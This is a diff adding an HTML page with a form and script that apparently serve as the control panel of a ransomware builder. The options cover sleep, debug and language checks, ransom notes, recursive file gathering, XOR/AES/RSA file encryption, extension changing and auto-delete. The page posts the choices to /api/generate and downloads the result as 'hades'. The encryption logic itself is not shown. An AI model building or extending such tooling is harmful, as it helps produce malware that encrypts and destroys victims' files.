@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Options Selector</title>
+  </head>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+    h1 {
+      text-align: center;
+      color: #333;
+      margin-top: 50px;
+    }
+    form {
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.2);
+      padding: 20px;
+      margin: 50px auto;
+      max-width: 600px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+    }
+    input[type="checkbox"],
+    select {
+      margin-left: 10px;
+    }
+    button[type="submit"] {
+      display: block;
+      margin: 20px auto;
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button[type="submit"]:hover {
+      background-color: #3e8e41;
+    }
+  </style>
+  <body>
+    <h2>Select the options:</h2>
+    <form id="options-form">
+      <label>
+        <input type="checkbox" name="sleep" value="on">
+        Sleep
+      </label><br>
+      <label>
+        <input type="checkbox" name="debug" value="on">
+        Check Debug
+      </label><br>
+      <label>
+        <input type="checkbox" name="language" value="on">
+        Check Language
+      </label><br>
+      <label>
+        <input type="checkbox" name="notes" value="on">
+        Add Notes
+      </label><br>
+      <label>
+        Get files:
+        <select name="get-files">
+          <option value="0">Directory</option>
+          <option value="1">Recursively</option>
+        </select>
+      </label><br>
+      <label>
+        Encrypt files:
+        <select name="encrypt-files">
+          <option value="0">None</option>
+          <option value="1">XOR</option>
+          <option value="2">AES</option>
+          <option value="3">RSA</option>
+        </select>
+      </label><br>
+      <label>
+        <input type="checkbox" name="change-extension" value="on">
+        Change Extension
+      </label><br>
+      <label>
+        <input type="checkbox" name="auto-delete" value="on">
+        Auto Delete
+      </label><br><br>
+      <button type="button" onclick="sendOptions()">Send</button>
+    </form>
+    <script>
+      function sendOptions() {
+        const form = document.getElementById('options-form');
+        const formData = new FormData(form);
+        const json = {};
+
+        for (const [key, value] of formData.entries()) {
+          json[key] = value;
+        }
+
+        const xhr = new XMLHttpRequest();
+        xhr.responseType = "blob";
+        xhr.onload = function (e) {
+          var blob = e.currentTarget.response;
+          var contentDispo = e.currentTarget.getResponseHeader('Content-Disposition');
+          // var fileName = contentDispo.match(/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/)[1];
+          var filename = "hades";
+          download(blob, filename);
+        }
+        xhr.open('POST', '/api/generate');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(json));
+      }
+      function download(blob, fileName) {
+          var a = document.createElement('a');
+          a.href = window.URL.createObjectURL(blob);
+          a.download = fileName;
+          a.dispatchEvent(new MouseEvent('click'));
+      }
+    </script>
+  </body>
+</html>
